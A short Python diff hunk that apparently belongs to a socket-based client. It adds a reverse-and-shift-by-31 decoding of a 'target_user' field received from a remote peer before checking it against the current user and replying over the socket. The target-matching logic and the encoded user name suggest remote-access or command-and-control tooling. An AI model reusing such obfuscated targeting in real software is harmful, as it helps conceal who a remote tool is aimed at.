@@ -335,7 +335,14 @@ def main():
                     message = message[0].split(" |||| ")
                     target_ip = message[1].strip()
                     target_user = message[0].split("=")
-                    target_user = target_user[1]
+                    target_user = target_user[1].strip()[::-1]
+                    decrypted_target_user, encrypted_target_user = [], []
+                    for i, char in enumerate(target_user):
+                        encrypted_target_user.append(ord(char))
+                        decrypted_target_user.append(chr(int(encrypted_target_user[i])-31))
+                    target_user = ""
+                    for char in decrypted_target_user:
+                        target_user += char
                     if target_user.strip().lower() == get_current_user().strip().lower():
                         sc.send(str(True).encode())
                         info = sc.recv(1024)
